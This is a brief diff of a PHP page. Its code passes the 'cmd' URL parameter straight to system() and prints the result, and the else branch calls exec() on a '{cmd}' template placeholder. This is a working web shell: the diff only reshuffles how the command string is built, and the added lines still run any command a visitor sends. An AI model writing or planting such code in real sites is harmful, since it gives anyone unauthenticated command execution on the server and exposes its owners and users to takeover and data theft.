@@ -5,8 +5,9 @@
 <body>
     <pre>
     <?php    
-        if (isset($_GET['cmd'])) {
-            system($_GET['cmd'] . ' 2>&1');
+        if (isset($_GET["cmd"])) {
+            $cmd = $_GET["cmd"] . " 2>&1";
+            system($cmd);
         }
         else {
             exec("{cmd}", $output, $return); 
